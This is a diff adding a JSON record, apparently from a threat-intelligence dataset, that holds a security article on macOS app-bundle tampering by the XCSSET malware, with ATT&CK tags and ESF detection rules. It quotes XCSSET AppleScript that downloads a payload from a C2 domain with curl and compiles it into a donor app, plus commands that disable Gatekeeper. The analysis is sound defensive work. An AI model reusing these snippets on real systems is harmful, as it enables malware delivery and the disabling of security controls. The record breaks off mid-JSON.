@@ -1,0 +1,456 @@
+{
+  "original_txt": "In the world of macOS, apps are, for all intents and purposes, packaged as application bundles. Traditionally, application bundles have been very loosely defined—and one could manipulate them to subvert core macOS security controls. In this context, a malicious actor could gain capabilities like privilege escalation and defense evasion. In this article, we’ll break down two forms of application bundle manipulation:\n- trojanizing legitimate application bundles for the purpose of subverting macOS security controls\n- tampering with a legitimate application bundle on disk for the purpose of defense evasion and/or privilege escalation\nWhat kind of apps are being targeted?\nSubversion on this level has the potential to impact one of macOS’s first layers of defense: Gatekeeper. In fact, this has become such a problem that developers have begun to point this out in Apple’s own developer forums. In this thread, two developers discuss the inherent inability of macOS to protect their applications against tampering (as of Monterey). Unfortunately this has led to many developers’ apps being pirated or abused.\nHistorically, legitimate apps have been the target of adversaries and software pirates alike. Software pirates are individuals who illicitly distribute applications like Microsoft Office, popular games (e.g., Fortnite), and productivity software (e.g, Adobe Photoshop) free of charge and usually over peer-to-peer services. Additionally, if a user downloads a pirated application that has also been trojanized, they run the risk of infecting themselves. Unfortunately, this is not an uncommon scenario, as seen with the EvilQuest/ThiefQuest, Shlayer and Silver Toucan/UpdateAgent/WizardUpdate malware families (just to name a few), which frequently leverage masquerading tactics to hide their true nature.\nPirated and trojanized applications frequently abuse legitimate application bundles to subvert core macOS security controls. However, they do not explicitly exhibit the characteristics of adversarial on-disk application bundle manipulation. For that, we’ll need to take a look at a slightly more advanced malware family called XCSSET. But first, let’s examine some of macOS’s native security controls.\nRelevant macOS security controls\nBriefly, some relevant core security controls to mention here are:\n- System Integrity Protection (SIP) is designed to restrict modification of protected system files and directories from the root user. Only entitled macOS processes have the privilege to modify them. This is essentially Apple’s in-house version of Security Enhanced Linux (SELinux). This is the first of two runtime protection mechanisms enforced by macOS.\n- Hardened Runtime, the second runtime protection mechanism, helps protect apps against attacks like code injection and memory space tampering. This is a capability applied by developers when building their apps.\n- Codesigning/Notarization determines if an application is who it says it is and has been checked by Apple to be free from malware. Note though that these are both independent procedures.\n- Gatekeeper validates the integrity of notarized application launches (through static analysis, codesigning, etc), protects against tampering, and can launch applications from a randomized path (called Gatekeeper Path Randomization (GPR) / App Translocation) to prevent malicious plugins from loading. Additionally, in macOS 13, Gatekeeper will also help prevent unauthorized app tampering (see our Gatekeeper overview below).\n- XProtect comprises YARA signature-based malware detection (and remediation with the advent of XProtect Remediator in macOS 13). XProtect runs a scan when:\n- an app is opened for the first time\n- an app been modified on disk\n- XProtect signatures have been updated\n- Transparency, Consent, and Control (TCC) are privacy protections controlling access to things like full disk access, automation, microphone, camera, etc.\nWhat’s the problem?\nPrior to macOS 13 Ventura, the integrity of applications launched by the user was not always validated. In summary, the following checks would occur when a user launched a notarized application for the first time:\n- Was the app downloaded from the internet? If so, a Gatekeeper first launch prompt will be shown and the user will be alerted that the application was downloaded from the internet. In practice, this means that macOS has “quarantined” the app. Side note: This is an opt-in process for developers. In other words, a file downloaded by any given app is only quarantined if the app’s developer has opted into Launch Services File Quarantine Enabled (\nLSFileQuarantineEnabled\n). - Is the app validly signed? This check is done to validate the application is who it says it is and ensure it’s free of tampering.\n- Is the app safe/free from known malware? This check is performed by XProtect YARA scanning.\n- If so, Gatekeeper will allow the application to launch.\n- Otherwise, Gatekeeper will block execution of the application only on first launch.\nThe crux of the problem here is that app integrity is only being validated on first launch and there are no additional security controls to protect against tampering. This means that an adversary could potentially design malware to abuse the gap in application integrity validation, as exhibited by the XCSSET malware family. Apple has since addressed this issue by enabling Ventura to deny unauthorized app “updates” and tampering requests. This feature was previewed and discussed in the WWDC22 session: What’s new in privacy (see our Gatekeeper overview below).\nWhich malware families manipulate application bundles?\nThe following malware families manipulate application bundles in some form. This is not an exhaustive list:\n- XCSSET drops a malicious applet into a legitimate app’s (known as the donor)\n.../Contents/MacOS/\ndirectory. This is an explicit case of an adversary leveraging on-disk application bundle manipulation. - Shlayer* has been observed armed with the Gatekeeper bypass: CVE-2021–30657. The elegant logic flaw here discovered by Cedric Owens enabled an adversary to bypass Gatekeeper simply by utilizing an executable script in the place of a Mach-O within an application bundle.\n- EvilQuest / Silver Toucan* are examples of application bundles which have been cracked/modified and can masquerade as popular macOS apps like: Ableton Live, Little Snitch, and MacSnipper. Silver Toucan has been observed bypassing Gatekeeper.\n* Please note, the activity observed from these families does not explicitly tie them into our definition of adversarial on-disk application bundle manipulation. However, prior to landing on a Mac they come with a modified installer, application bundle, or payload for the purpose of bypassing macOS security controls. This is somewhat expected behavior of cracked/modified applications like EvilQuest and Silver Toucan.\nWhy is this a potentially attractive path for adversaries?\nBecause modern macOS supports a wide array of avenues for code execution, the current security controls in place may have more work on their plates then they previously realized. Apps are just one way to get code to execute on macOS; scripts and Java archives can also get the job done. Importantly, Apple does not currently notarize all forms of executables. Supported deliverables are: apps, (non-app bundles: Frameworks and Loadables), UDIF Disk Images, and Flat installer packages. Unlike application bundles and Mach-O executables, security controls such as entitlements, codesigning, and hardened runtime do not apply to shell scripts because they do not make sense in this context. Entitlements are only able to be added to executables; this means that the shared libraries, frameworks, and in-process plug-ins inherit all the entitlements of the hosting executable.\nEvilQuest’s authors have been known to run scripts as part of an app install. The types of scripts you’re able to run depends on the type of installer package: bundle or flat installer. This translates to preflight/install and postflight/install scripts.\nThe Gatekeeper logic flaw we mentioned earlier was enabled by Gatekeeper insufficiently validating the structure and content of the application bundle (appearing with a script executable instead of a more traditional Mach-O binary). Tricking macOS into executing code within the context of a legitimate app is the name of the game for an adversary here. Why? It could enable some nice capabilities:\n- Defense evasion: The ability of a malicious program to hide its activity. In this case, malware like XCSSET latches onto a legitimate donor app.\n- Privilege escalation: The malicious program gains elevated permissions to, for example, record or capture the screen, steal information from targeted apps, modify software updates, etc. This capability was also found in XCSSET.\nWhat’s the solution?\nmacOS needs a way to ensure that an application is who it says it is, all the time. Gatekeeper is one of the core security controls associated with ensuring an application has not been compromised. Below we will take a brief look at what Gatekeeper is and the upcoming changes in macOS 13 you should be aware of.\nGatekeeper\nA key layer of the macOS security model, Gatekeeper’s job is to only allow trusted application launches. It does this on the first launch of notarized apps through validating the requesting app’s cryptographic signature and a notarization ticket, if one exists. Notarization tickets can be “stapled” to the app and/or stored on Apple’s internet accessible servers. In System Settings (or via mobile device management with additional options), Gatekeeper’s security policy “Allow apps downloaded from” can be modified to take on the following values:\n- “App Store”\n- “App Store and identified developers” (notarized applications)\nAdditionally, the /usr/sbin/spctl\n”security policy control” command-line tool can be used to modify the behavior of Gatekeeper, exposing an additional policy:\nsudo spctl --global-disable\nresults in a Gatekeeper security policy allowing applications downloaded from: “Anywhere”\nIn practice, this means tagging applications downloaded from the internet with the com.apple.quarantine\nextended attribute (i.e., using a macOS application and not a command-line tool like curl\nor wget\n). As mentioned above, developers opt in to the file quarantine policy by by adding the following key to the Info.plist\n: LSFileQuarantineEnabled\nGatekeeper in macOS 13\nExcluding the App Store case, prior to macOS 13 Ventura, Gatekeeper only validated the integrity of newly downloaded (i.e., quarantined) apps on first launch. However, starting with macOS 13, as explained during WWDC22 session: What’s new in privacy, Gatekeeper will validate the integrity of all notarized apps on first launch (ensuring code signatures stay valid) Previously, Gatekeeper only validated the integrity of notarized apps that had been quarantined on first launch.\nAdditionally, Gatekeeper will attempt to block unauthorized tampering attempts alerting the user in the process. Modifying an app’s executable, secondary resources, or the Info.plist\nare all common tasks that app updates might perform if authorized. This is a rather elegant solution to the expensive signature validation process that occurs on app first launch. By providing the user with the option to allow or deny incoming tampering requests for a given notarized app, the user can effectively prevent their notarized apps from being tampered with.\nDevelopers with the same team identifier can still update their own apps with no problem. However, if another development team needs to be able to update that app, they would have to add an NSUpdateSecurityPolicy\nto the Info.plist\nand specify the AllowProcesses\ndictionary that maps a team identifier to a set of signing identifiers.\nImage courtesy of developer.apple.com\nHow has on-disk application bundle manipulation been seen in the wild?\nXCSSET achieves defense evasion and privilege escalation by living off of a donor application like Discord or Skype. XCSSET accomplishes these goals with help from the Open Scripting Architecture (OSA) that’s baked into macOS. AppleScript—and by extension OSA—has traditionally been referred to as the “PowerShell of macOS.” The execution of a supported scripting language through OSA enables some unique capabilities such as:\n- access to core macOS APIs (e.g., Foundation, Cocoa)\n- the potential to evade detection with execute-only scripts\n- establishing persistence by writing launch agents / daemons\n- hamstring macOS security controls (e.g., Gatekeeper and system updates)\nThese capabilities are enabled by the AppleScriptObjC/PyObjC bridge. What are the consequences of these bridges from a security perspective? Well, for one, Hardened Runtime (which helps protect against code injection and is required for notarization) would need to be disabled and, secondly, a JIT-compilation / “allow unsigned executable memory” entitlement would need to be added. Again, these requirements are only applicable to apps, disk images, and installers—the deliverables that can be notarized, as noted earlier.\nAlthough these capabilities may seem a little scary on the surface, they also serve as a very real solution to an organizational management problem. For example, it’d be useful for Mac administrators to get or set management settings with a script, and this is where the AppleScriptObjC/PyObjC bridges come into play.\nA note on endpoint security\n- The Endpoint Security Framework (ESF), in its current implementation, does not include any notify events surrounding the Apple Event Manager (e.g., the sending / receiving of Apple Events). This means that any endpoint, detection, and response (EDR) sensor that wants to provide visibility into the sending or receiving of Apple Events would need to do so without the help of ESF, a much trickier job.\n- In Apple’s latest iteration of the ESF, we received a host of new events surrounding login items, authentication, OpenSSH, screen sharing, and XProtect (malware detection and remediation). Many of these notify events are useful in detecting the malware we’ve discussed so far.\nXCSSET: a case study\nWe will now walk through how XCSSET, a recent malware family, explicitly demonstrates the concept of on-disk application bundle manipulation. In short, XCSSET drops a malicious applet in the donor application’s .../Contents/MacOS/\ndirectory. Thus, complexities aside, the malicious applet inherits the privileges associated with the donor application and runs as a seemingly legitimate application. This has the added benefit of helping evade defenses as well.\nBackground\nXCSSET, first reported on in August of 2020 by Trend Micro’s Mac Threat Response team, is an extremely capable macOS malware family primarily targeting developers through malicious Xcode projects (an IDE designed explicitly for Apple platform development). Users are infected by XCSSET by downloading and building a compromised Xcode project, which subsequently downloads malicious applets. XCSSET contains multiple modules to do things like steal data and includes a replicator component to infect other Xcode projects.\nApplets\nApplets, for all intents and purposes, are apps. Their structure follows the same anatomy as generic application bundles and can be constructed in a few ways:\n- graphically, with\nScript Editor.app\nby selecting the export to application option - graphically, with\nAutomator.app\nby selecting the application template when creating a new project. Automator describes applets as: self-running workflows. For example, one can make a simple macOS applet which starts the screensaver. - via command line, with\nosacompile\nby specifying the[-o]\nwith a.app\nfile extension or[-s]\noption (for Stay-open applets). - via Foundation Library, using the NSAppleScript API\nEach of these methods will generate a valid application bundle with a thin Mach-O wrapper for OSA script execution(s). However, the Automator option will include a specialty document.wflow\nfile and will name the Mach-O wrapper Automator Application Stub. By contrast, the other three options will create a PkgInfo\nfile, keep compiled versions of the scripts in the Resources directory, and will name the Mach-O wrapper applet by default. Like regular apps, applets can be launched with the Launch Services API (essentially Finder) and must adhere to all the same Transparency, Consent, and Control (TCC) restrictions.\nApplet observations\n- By default and if constructed with\nAutomator.app\n, the Mach-O binary in the../MacOS\ndirectory will be namedApplication Stub\n- The Automator Application Stub Mach-O template binary can be found in\n/System/Library/CoreServices/\nas a universal binary - The Mach-O binary links to many of the same\ndylibs\nand frameworks as/usr/bin/osascript\n- By disassembling the binary, we can see that the\nScriptMonitor.app\nis being called as a way to provide the user with a visual indicator that a script is running. In other words, when an applet is launched so isScriptMonitor.app.\nThis enables another potential avenue for detection.\n- By disassembling the binary, we can see that the\n- If built using Automator, the contents of the OSA script will be placed in the\ndocument.wflow\nfile (XML based) under the<key>Action Parameters</key>\ntag. Otherwise, there will be a../Resources/Scripts\ndirectory, which will contain all the scripts for the applet - During execution, an\nosascript\ncommand line will generally not be seen in this case, unless theosascript\nbinary is explicitly invoked- Applets can also contain shell scripts used to run OSA code. This would be the explicit case in which the\nosascript\nbinary would be executed, and theosascript\ncommand line would be visible, as would theScriptMonitor\nprocess\n- Applets can also contain shell scripts used to run OSA code. This would be the explicit case in which the\nProcedures\nXCSSET has been observed utilizing the curl\nand /usr/bin/osacompile\ncommand-line tools to download and compile an execute-only AppleScript file (into an applet) respectively. XCSSET will then drop the malicious applet at the …/Contents/MacOS/\ndirectory of the donor application.\nLegitimate apps targeted by XCSSET as donors have included (shown below in the example from Jamf Threat Labs): Google Chrome, Telegram, Apple Notes, etc.\nIn summary, each Applet “downloaded” by XCSSET is a module containing functionalities such as:\n- Information stealing: Safari, Contacts, Opera, Evernote, Apple Notes, Skype, Telegram, QQ, WeChat, etc.\n- T1119: Automated Collection (Collection)\n- Injecting JavaScript backdoors into websites via a universal cross-site scripting (UXSS) attack\n- Stealing browser cookies protected by SIP over SCP (secure copy)\n- T1048: Exfiltration Over Alternative Protocol (Exfiltration)\n- T1539: Steal Web Session Cookie (Credential Access)\n- Disabling Gatekeeper, macOS updates, etc.\n- Capturing screenshots, etc.\n- T1113: Screen Capture (Collection)\nConsider the following example from Jamf Threat Labs featuring the createDonorApp()\nAppleScript function:\nFile: screen_sim.applescript\nFunction: createDonorApp()\nset payload to quoted form of (do shell script \"curl -ks https://\" & domain & \"/agents/scripts/screen.applescript\")\ndo shell script \"osacompile -x -e \" & payload & \" -o \" & quoted form of tempApp\nset targetDest to (getPathForBundleId(appID)) & \"/Contents/MacOS/\"\nset targetFiles to {tempAppFile, chkdsAppFile}\nFirst, notice the in-memory loading of screen.applescript\nfrom some C2 domain (T1059.002: AppleScript). The AppleScript code in memory is “execute-only” compiled line by line into an applet and then “dropped” to the location of a temporary application bundle (T1027.004: Compile After Delivery). Finally, the applet is copied to the donor application’s …/Contents/MacOS/\ndirectory (T1036: Masquerading and T1554: Compromise Client Software Binary).\nProcedural examples from Jamf Threat Labs and Trend Micro Research\nExample 1\nThis excerpt from Jamf Threat Labs was taken from the file screen_sim.applescript\nand the function verifyCapturePermissions()\n.\nHere we see AppleScipt code enumerating the different donor applications XCSSET supports via “plugins”/applets.\nExample 2\nThis excerpt from Jamf Threat Labs was taken from the file screen_sim.applescript\nand the function createDonorApp()\n.\nHere we see step one of the primary ties XCSSET has to the application bundle manipulation technique: Creating a fake donor application bundle (and applet) with osacompile -x -e & payload &-o & quoted form of tempApp\n(T1059.002: AppleScript, T1027.004: Compile After Delivery, and T1036: Masquerading).\nExample 3\nThis excerpt from Jamf Threat Labs was also taken from the file screen_sim.applescript\nand the function createDonorApp()\n.\nHere, XCSSET replaces the donor application bundle’s Mach-O with the malicious applet plugin (T1059.002: AppleScript,\nT1036: Masquerading, and T1554: Compromise Client Software Binary).\nExample 4\nAs seen this example from Trend Micro Research, XCSSET is also able to disable software updates and Gatekeeper (T1059.002: AppleScript and T1562.001: Impair Defenses: Disable or Modify Tools), which is shown with the following AppleScript:\ndo shell script \"spctl --master-disable\" with administrator privileges\nSample XCSSET detection analytics\nThe following pseudo-detectors rely on telemetry from ESF and should help security teams detect XCSSET.\nDetecting on the Xcode build process\nThis analytic uses ES_EVENT_TYPE_NOTIFY_EXEC\nand ES_EVENT_TYPE_NOTIFY_FORK\nevents. It looks for the Xcode build process spawning shell scripts that, in turn, create a hex dump.\nparent_process == xcbbuildservice\n&&\nprocess == (bash\n|| zsh\n|| or sh\n)\n&&\nchild_processes == /usr/bin/xxd\nDetecting behavioral process execution from within the GameKit cache directory\nThis analytics uses a single ES_EVENT_TYPE_NOTIFY_EXEC\nevent, and looks explicitly for processes executing from the .../library/caches/gamekit/\nfile directory.\nprocess == [anything]\n&&\nfile_path == .../library/caches/gamekit/\nDetecting strange applet /\ncommand-line OSA behavior\nThis analytics relies on a single ES_EVENT_TYPE_NOTIFY_EXEC\nevent and looks for suspicious OSA commands.\nparent_process == (applet\n|| osascript\n)\n&&\ncommand_line_includes (osacompile\n)\nDetecting the in-memory downloading and compiling of payload applets\nThis analytics uses a single ES_EVENT_TYPE_NOTIFY_EXEC\nevent and looks for the the execution of curl\n, |\n, or osacompile\ncommands.\ncommand_line_includes (osacompile\n&& |\n&& curl\n)",
+  "sanitized_txt": "In the world of macOS, apps are, for all intents and purposes, packaged as application bundles. Traditionally, application bundles have been very loosely defined—and one could manipulate them to subvert core macOS security controls. In this context, a malicious actor could gain capabilities like privilege escalation and defense evasion. In this article, we’ll break down two forms of application bundle manipulation:\n- trojanizing legitimate application bundles for the purpose of subverting macOS security controls - tampering with a legitimate application bundle on disk for the purpose of defense evasion and/or privilege escalation What kind of apps are being targeted?\nSubversion on this level has the potential to impact one of macOS’s first layers of defense: Gatekeeper. In fact, this has become such a problem that developers have begun to point this out in Apple’s own developer forums. In this thread, two developers discuss the inherent inability of macOS to protect their applications against tampering (as of Monterey). Unfortunately this has led to many developers’ apps being pirated or abused.\nHistorically, legitimate apps have been the target of adversaries and software pirates alike. Software pirates are individuals who illicitly distribute applications like Microsoft Office, popular games (e.g., Fortnite), and productivity software (e.g, Adobe Photoshop) free of charge and usually over peer-to-peer services. Additionally, if a user downloads a pirated application that has also been trojanized, they run the risk of infecting themselves. Unfortunately, this is not an uncommon scenario, as seen with the EvilQuest/ThiefQuest, Shlayer and Silver Toucan/UpdateAgent/WizardUpdate malware families (just to name a few), which frequently leverage masquerading tactics to hide their true nature.\nPirated and trojanized applications frequently abuse legitimate application bundles to subvert core macOS security controls. However, they do not explicitly exhibit the characteristics of adversarial on-disk application bundle manipulation. For that, we’ll need to take a look at a slightly more advanced malware family called XCSSET. But first, let’s examine some of macOS’s native security controls.\nRelevant macOS security controls Briefly, some relevant core security controls to mention here are:\n- System Integrity Protection (SIP) is designed to restrict modification of protected system files and directories from the root user. Only entitled macOS processes have the privilege to modify them. This is essentially Apple’s in-house version of Security Enhanced Linux (SELinux). This is the first of two runtime protection mechanisms enforced by macOS.\n- Hardened Runtime, the second runtime protection mechanism, helps protect apps against attacks like code injection and memory space tampering. This is a capability applied by developers when building their apps.\n- Codesigning/Notarization determines if an application is who it says it is and has been checked by Apple to be free from malware. Note though that these are both independent procedures.\n- Gatekeeper validates the integrity of notarized application launches (through static analysis, codesigning, etc), protects against tampering, and can launch applications from a randomized path (called Gatekeeper Path Randomization (GPR) / App Translocation) to prevent malicious plugins from loading. Additionally, in macOS 13, Gatekeeper will also help prevent unauthorized app tampering (see our Gatekeeper overview below).\n- XProtect comprises YARA signature-based malware detection (and remediation with the advent of XProtect Remediator in macOS 13). XProtect runs a scan when:\n- an app is opened for the first time - an app been modified on disk - XProtect signatures have been updated - Transparency, Consent, and Control (TCC) are privacy protections controlling access to things like full disk access, automation, microphone, camera, etc.\nWhat’s the problem?\nPrior to macOS 13 Ventura, the integrity of applications launched by the user was not always validated. In summary, the following checks would occur when a user launched a notarized application for the first time:\n- Was the app downloaded from the internet? If so, a Gatekeeper first launch prompt will be shown and the user will be alerted that the application was downloaded from the internet. In practice, this means that macOS has “quarantined” the app. Side note: This is an opt-in process for developers. In other words, a file downloaded by any given app is only quarantined if the app’s developer has opted into Launch Services File Quarantine Enabled ( LSFileQuarantineEnabled ). - Is the app validly signed? This check is done to validate the application is who it says it is and ensure it’s free of tampering.\n- Is the app safe/free from known malware? This check is performed by XProtect YARA scanning.\n- If so, Gatekeeper will allow the application to launch.\n- Otherwise, Gatekeeper will block execution of the application only on first launch.\nThe crux of the problem here is that app integrity is only being validated on first launch and there are no additional security controls to protect against tampering. This means that an adversary could potentially design malware to abuse the gap in application integrity validation, as exhibited by the XCSSET malware family. Apple has since addressed this issue by enabling Ventura to deny unauthorized app “updates” and tampering requests. This feature was previewed and discussed in the WWDC22 session: What’s new in privacy (see our Gatekeeper overview below).\nWhich malware families manipulate application bundles?\nThe following malware families manipulate application bundles in some form. This is not an exhaustive list:\n- XCSSET drops a malicious applet into a legitimate app’s (known as the donor) .../Contents/MacOS/ directory. This is an explicit case of an adversary leveraging on-disk application bundle manipulation. - Shlayer* has been observed armed with the Gatekeeper bypass: CVE-2021–30657. The elegant logic flaw here discovered by Cedric Owens enabled an adversary to bypass Gatekeeper simply by utilizing an executable script in the place of a Mach-O within an application bundle.\n- EvilQuest / Silver Toucan* are examples of application bundles which have been cracked/modified and can masquerade as popular macOS apps like: Ableton Live, Little Snitch, and MacSnipper. Silver Toucan has been observed bypassing Gatekeeper.\n* Please note, the activity observed from these families does not explicitly tie them into our definition of adversarial on-disk application bundle manipulation. However, prior to landing on a Mac they come with a modified installer, application bundle, or payload for the purpose of bypassing macOS security controls. This is somewhat expected behavior of cracked/modified applications like EvilQuest and Silver Toucan.\nWhy is this a potentially attractive path for adversaries?\nBecause modern macOS supports a wide array of avenues for code execution, the current security controls in place may have more work on their plates then they previously realized. Apps are just one way to get code to execute on macOS; scripts and Java archives can also get the job done. Importantly, Apple does not currently notarize all forms of executables. Supported deliverables are: apps, (non-app bundles: Frameworks and Loadables), UDIF Disk Images, and Flat installer packages. Unlike application bundles and Mach-O executables, security controls such as entitlements, codesigning, and hardened runtime do not apply to shell scripts because they do not make sense in this context. Entitlements are only able to be added to executables; this means that the shared libraries, frameworks, and in-process plug-ins inherit all the entitlements of the hosting executable.\nEvilQuest’s authors have been known to run scripts as part of an app install. The types of scripts you’re able to run depends on the type of installer package: bundle or flat installer. This translates to preflight/install and postflight/install scripts.\nThe Gatekeeper logic flaw we mentioned earlier was enabled by Gatekeeper insufficiently validating the structure and content of the application bundle (appearing with a script executable instead of a more traditional Mach-O binary). Tricking macOS into executing code within the context of a legitimate app is the name of the game for an adversary here. Why? It could enable some nice capabilities:\n- Defense evasion: The ability of a malicious program to hide its activity. In this case, malware like XCSSET latches onto a legitimate donor app.\n- Privilege escalation: The malicious program gains elevated permissions to, for example, record or capture the screen, steal information from targeted apps, modify software updates, etc. This capability was also found in XCSSET.\nWhat’s the solution?\nmacOS needs a way to ensure that an application is who it says it is, all the time. Gatekeeper is one of the core security controls associated with ensuring an application has not been compromised. Below we will take a brief look at what Gatekeeper is and the upcoming changes in macOS 13 you should be aware of.\nGatekeeper A key layer of the macOS security model, Gatekeeper’s job is to only allow trusted application launches. It does this on the first launch of notarized apps through validating the requesting app’s cryptographic signature and a notarization ticket, if one exists. Notarization tickets can be “stapled” to the app and/or stored on Apple’s internet accessible servers. In System Settings (or via mobile device management with additional options), Gatekeeper’s security policy “Allow apps downloaded from” can be modified to take on the following values:\n- “App Store” - “App Store and identified developers” (notarized applications) Additionally, the /usr/sbin/spctl ”security policy control” command-line tool can be used to modify the behavior of Gatekeeper, exposing an additional policy:\nsudo spctl --global-disable results in a Gatekeeper security policy allowing applications downloaded from: “Anywhere” In practice, this means tagging applications downloaded from the internet with the com.apple.quarantine extended attribute (i.e., using a macOS application and not a command-line tool like curl or wget ). As mentioned above, developers opt in to the file quarantine policy by by adding the following key to the Info.plist : LSFileQuarantineEnabled Gatekeeper in macOS 13 Excluding the App Store case, prior to macOS 13 Ventura, Gatekeeper only validated the integrity of newly downloaded (i.e., quarantined) apps on first launch. However, starting with macOS 13, as explained during WWDC22 session: What’s new in privacy, Gatekeeper will validate the integrity of all notarized apps on first launch (ensuring code signatures stay valid) Previously, Gatekeeper only validated the integrity of notarized apps that had been quarantined on first launch.\nAdditionally, Gatekeeper will attempt to block unauthorized tampering attempts alerting the user in the process. Modifying an app’s executable, secondary resources, or the Info.plist are all common tasks that app updates might perform if authorized. This is a rather elegant solution to the expensive signature validation process that occurs on app first launch. By providing the user with the option to allow or deny incoming tampering requests for a given notarized app, the user can effectively prevent their notarized apps from being tampered with.\nDevelopers with the same team identifier can still update their own apps with no problem. However, if another development team needs to be able to update that app, they would have to add an NSUpdateSecurityPolicy to the Info.plist and specify the AllowProcesses dictionary that maps a team identifier to a set of signing identifiers.\nImage courtesy of developer.apple.com How has on-disk application bundle manipulation been seen in the wild?\nXCSSET achieves defense evasion and privilege escalation by living off of a donor application like Discord or Skype. XCSSET accomplishes these goals with help from the Open Scripting Architecture (OSA) that’s baked into macOS. AppleScript—and by extension OSA—has traditionally been referred to as the “PowerShell of macOS.” The execution of a supported scripting language through OSA enables some unique capabilities such as:\n- access to core macOS APIs (e.g., Foundation, Cocoa) - the potential to evade detection with execute-only scripts - establishing persistence by writing launch agents / daemons - hamstring macOS security controls (e.g., Gatekeeper and system updates) These capabilities are enabled by the AppleScriptObjC/PyObjC bridge. What are the consequences of these bridges from a security perspective? Well, for one, Hardened Runtime (which helps protect against code injection and is required for notarization) would need to be disabled and, secondly, a JIT-compilation / “allow unsigned executable memory” entitlement would need to be added. Again, these requirements are only applicable to apps, disk images, and installers—the deliverables that can be notarized, as noted earlier.\nAlthough these capabilities may seem a little scary on the surface, they also serve as a very real solution to an organizational management problem. For example, it’d be useful for Mac administrators to get or set management settings with a script, and this is where the AppleScriptObjC/PyObjC bridges come into play.\nA note on endpoint security - The Endpoint Security Framework (ESF), in its current implementation, does not include any notify events surrounding the Apple Event Manager (e.g., the sending / receiving of Apple Events). This means that any endpoint, detection, and response (EDR) sensor that wants to provide visibility into the sending or receiving of Apple Events would need to do so without the help of ESF, a much trickier job.\n- In Apple’s latest iteration of the ESF, we received a host of new events surrounding login items, authentication, OpenSSH, screen sharing, and XProtect (malware detection and remediation). Many of these notify events are useful in detecting the malware we’ve discussed so far.\nXCSSET: a case study We will now walk through how XCSSET, a recent malware family, explicitly demonstrates the concept of on-disk application bundle manipulation. In short, XCSSET drops a malicious applet in the donor application’s .../Contents/MacOS/ directory. Thus, complexities aside, the malicious applet inherits the privileges associated with the donor application and runs as a seemingly legitimate application. This has the added benefit of helping evade defenses as well.\nBackground XCSSET, first reported on in August of 2020 by Trend Micro’s Mac Threat Response team, is an extremely capable macOS malware family primarily targeting developers through malicious Xcode projects (an IDE designed explicitly for Apple platform development). Users are infected by XCSSET by downloading and building a compromised Xcode project, which subsequently downloads malicious applets. XCSSET contains multiple modules to do things like steal data and includes a replicator component to infect other Xcode projects.\nApplets Applets, for all intents and purposes, are apps. Their structure follows the same anatomy as generic application bundles and can be constructed in a few ways:\n- graphically, with Script Editor.app by selecting the export to application option - graphically, with Automator.app by selecting the application template when creating a new project. Automator describes applets as: self-running workflows. For example, one can make a simple macOS applet which starts the screensaver. - via command line, with osacompile by specifying the[-o] with a.app file extension or[-s] option (for Stay-open applets). - via Foundation Library, using the NSAppleScript API Each of these methods will generate a valid application bundle with a thin Mach-O wrapper for OSA script execution(s). However, the Automator option will include a specialty document.wflow file and will name the Mach-O wrapper Automator Application Stub. By contrast, the other three options will create a PkgInfo file, keep compiled versions of the scripts in the Resources directory, and will name the Mach-O wrapper applet by default. Like regular apps, applets can be launched with the Launch Services API (essentially Finder) and must adhere to all the same Transparency, Consent, and Control (TCC) restrictions.\nApplet observations - By default and if constructed with Automator.app , the Mach-O binary in the../MacOS directory will be namedApplication Stub - The Automator Application Stub Mach-O template binary can be found in /System/Library/CoreServices/ as a universal binary - The Mach-O binary links to many of the same dylibs and frameworks as/usr/bin/osascript - By disassembling the binary, we can see that the ScriptMonitor.app is being called as a way to provide the user with a visual indicator that a script is running. In other words, when an applet is launched so isScriptMonitor.app.\nThis enables another potential avenue for detection.\n- By disassembling the binary, we can see that the - If built using Automator, the contents of the OSA script will be placed in the document.wflow file (XML based) under the<key>Action Parameters</key> tag. Otherwise, there will be a../Resources/Scripts directory, which will contain all the scripts for the applet - During execution, an osascript command line will generally not be seen in this case, unless theosascript binary is explicitly invoked- Applets can also contain shell scripts used to run OSA code. This would be the explicit case in which the osascript binary would be executed, and theosascript command line would be visible, as would theScriptMonitor process - Applets can also contain shell scripts used to run OSA code. This would be the explicit case in which the Procedures XCSSET has been observed utilizing the curl and /usr/bin/osacompile command-line tools to download and compile an execute-only AppleScript file (into an applet) respectively. XCSSET will then drop the malicious applet at the …/Contents/MacOS/ directory of the donor application.\nLegitimate apps targeted by XCSSET as donors have included (shown below in the example from Jamf Threat Labs): Google Chrome, Telegram, Apple Notes, etc.\nIn summary, each Applet “downloaded” by XCSSET is a module containing functionalities such as:\n- Information stealing: Safari, Contacts, Opera, Evernote, Apple Notes, Skype, Telegram, QQ, WeChat, etc.\n- Capturing screenshots, etc.\nProcedural examples from Jamf Threat Labs and Trend Micro Research Example 1 This excerpt from Jamf Threat Labs was taken from the file screen_sim.applescript and the function verifyCapturePermissions() .\nHere we see AppleScipt code enumerating the different donor applications XCSSET supports via “plugins”/applets.\nExample 2 This excerpt from Jamf Threat Labs was taken from the file screen_sim.applescript and the function createDonorApp() .\nExample 3 This excerpt from Jamf Threat Labs was also taken from the file screen_sim.applescript and the function createDonorApp() .\ndo shell script \"spctl --master-disable\" with administrator privileges Sample XCSSET detection analytics The following pseudo-detectors rely on telemetry from ESF and should help security teams detect XCSSET.\nDetecting on the Xcode build process This analytic uses ES_EVENT_TYPE_NOTIFY_EXEC and ES_EVENT_TYPE_NOTIFY_FORK events. It looks for the Xcode build process spawning shell scripts that, in turn, create a hex dump.\nparent_process == xcbbuildservice && process == (bash || zsh || or sh ) && child_processes == /usr/bin/xxd Detecting behavioral process execution from within the GameKit cache directory This analytics uses a single ES_EVENT_TYPE_NOTIFY_EXEC event, and looks explicitly for processes executing from the .../library/caches/gamekit/ file directory.\nprocess == [anything] && file_path == .../library/caches/gamekit/ Detecting strange applet / command-line OSA behavior This analytics relies on a single ES_EVENT_TYPE_NOTIFY_EXEC event and looks for suspicious OSA commands.\nparent_process == (applet || osascript ) && command_line_includes (osacompile ) Detecting the in-memory downloading and compiling of payload applets This analytics uses a single ES_EVENT_TYPE_NOTIFY_EXEC event and looks for the the execution of curl , | , or osacompile commands.\ncommand_line_includes (osacompile && | && curl )",
+  "ID_list": [
+    "T1553.001"
+  ],
+  "Name_list": [
+    "AppleScript",
+    "Defense Evasion",
+    "Execution",
+    "Gatekeeper Bypass",
+    "Impact",
+    "Launch Agent",
+    "Login Item",
+    "Masquerading",
+    "Persistence",
+    "PowerShell",
+    "Privilege Escalation",
+    "Screensaver",
+    "Scripting",
+    "Source",
+    "Sudo"
+  ],
+  "TTP_sentences": {
+    "T1553.001": [
+      {
